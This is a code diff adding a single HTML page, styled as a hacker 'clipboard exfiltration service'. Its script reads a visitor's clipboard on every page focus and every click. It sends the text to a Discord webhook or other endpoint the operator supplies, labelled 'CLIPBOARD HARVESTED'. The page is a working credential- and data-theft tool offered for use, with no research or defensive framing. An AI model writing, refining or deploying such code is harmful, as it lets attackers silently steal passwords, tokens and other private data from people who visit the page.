@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SYSTEM // CLIPBOARD_INJECTOR</title>
+    <style>
+        :root { --accent: #00ff41; --danger: #ff003c; --bg-blur: rgba(0, 0, 0, 0.1); }
+        body, html { margin:0; padding:0; height:100%; font-family:'Consolas', monospace; color:#fff; overflow:hidden; }
+        
+        #video-bg { 
+            position:fixed; right:0; bottom:0; min-width:100%; min-height:100%; 
+            z-index:-1; filter:brightness(0.3) saturate(1.5); object-fit:cover; 
+        }
+
+        .container { 
+            position:relative; z-index:1; background:var(--bg-blur); 
+            backdrop-filter:blur(15px); border:1px solid #1a1a1a; 
+            width:900px; margin:10vh auto; padding:30px; 
+            box-shadow: 0 0 50px rgba(0,0,0,1);
+        }
+
+        .header { border-bottom: 2px solid var(--danger); margin-bottom: 20px; padding-bottom: 10px; }
+        .header h1 { color:var(--danger); text-shadow:0 0 15px var(--danger); margin:0; letter-spacing:10px; text-transform:uppercase; font-size:1.5rem; }
+
+        .config-panel { display:grid; grid-template-columns: 1fr 1fr; gap:20px; }
+        label { display:block; color:#888; margin-bottom:5px; font-size:0.8rem; }
+        input { background:#050505; border:1px solid #333; color:var(--accent); padding:12px; width:95%; outline:none; font-family:'Consolas'; }
+        
+        .status-box { 
+            background:#000; border:1px solid #222; margin-top:20px; 
+            height:250px; padding:15px; overflow-y:auto; font-size:0.85rem;
+        }
+
+        .btn-init { 
+            background:var(--danger); color:#fff; border:none; padding:15px; 
+            width:100%; margin-top:20px; cursor:pointer; font-weight:bold;
+            letter-spacing:2px; transition: 0.3s;
+        }
+        .btn-init:hover { background:#ff2e5b; box-shadow: 0 0 20px var(--danger); }
+
+        .log-entry { margin-bottom: 5px; border-left: 2px solid #444; padding-left: 10px; }
+        .success { border-color: var(--accent); color: var(--accent); }
+        .fail { border-color: var(--danger); color: var(--danger); }
+    </style>
+</head>
+<body>
+
+    <video autoplay muted loop id="video-bg">
+        <source src="ca63eccfcf11bcd02c1a900196de630f_720w.mp4" type="video/mp4">
+    </video>
+
+    <div class="container">
+        <div class="header">
+            <h1>CLIPBOARD // EXFILTRATION_SERVICE</h1>
+        </div>
+
+        <div class="config-panel">
+            <div>
+                <label>EXFIL_API_ENDPOINT (Discord Webhook / Custom API)</label>
+                <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
+            </div>
+            <div>
+                <label>LISTENER_MODE</label>
+                <input type="text" value="ON_PAGE_FOCUS / ON_USER_INTERACTION" readonly style="color:#555">
+            </div>
+        </div>
+
+        <button class="btn-init" onclick="initiateListener()">START STEALTH LISTENER</button>
+
+        <div class="status-box" id="terminal">
+            <div class="log-entry">[SYSTEM] Initializing Core Components...</div>
+            <div class="log-entry">[SYSTEM] Awaiting legitimate Webhook API entry...</div>
+        </div>
+    </div>
+
+    <script>
+        const terminal = document.getElementById('terminal');
+        
+        function log(msg, type = '') {
+            const div = document.createElement('div');
+            div.className = `log-entry ${type}`;
+            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            terminal.appendChild(div);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        async function exfiltrate(data) {
+            const webhookUrl = document.getElementById('webhook').value;
+            if(!webhookUrl) {
+                log("ABORT: No API Webhook defined.", "fail");
+                return;
+            }
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "🚨 **CLIPBOARD HARVESTED** 🚨",
+                        embeds: [{
+                            title: "Data Exfiltration Success",
+                            description: `\`\`\`${data}\`\`\``,
+                            color: 16711740,
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+
+                if(response.ok) log("EXFIL_COMPLETE: Packet delivered to API.", "success");
+                else log("API_REJECTION: Status " + response.status, "fail");
+            } catch (e) {
+                log("NETWORK_ERROR: Exfiltration failed.", "fail");
+            }
+        }
+
+        async function steal() {
+            try {
+                // Focus is required for reading clipboard
+                const text = await navigator.clipboard.readText();
+                if(text) {
+                    log(`DATA_CAPTURED: "${text.substring(0, 20)}..."`, "success");
+                    await exfiltrate(text);
+                }
+            } catch (err) {
+                log("ACCESS_DENIED: Clipboard permissions required.", "fail");
+            }
+        }
+
+        function initiateListener() {
+            const webhookUrl = document.getElementById('webhook').value;
+            if(!webhookUrl.includes('http')) {
+                log("INVALID_CONFIG: Provide a real API URL.", "fail");
+                return;
+            }
+
+            log("LISTENER_ACTIVE: Armed on document focus.", "success");
+            
+            // Real trigger: Capture every time a user switches back to this tab
+            window.addEventListener('focus', () => {
+                log("TRIGGER_EVENT: Page Focus detected.");
+                steal();
+            });
+
+            // Fallback: Capture on any click
+            window.addEventListener('click', () => {
+                log("TRIGGER_EVENT: Mouse Interaction detected.");
+                steal();
+            });
+        }
+    </script>
+</body>
+</html>
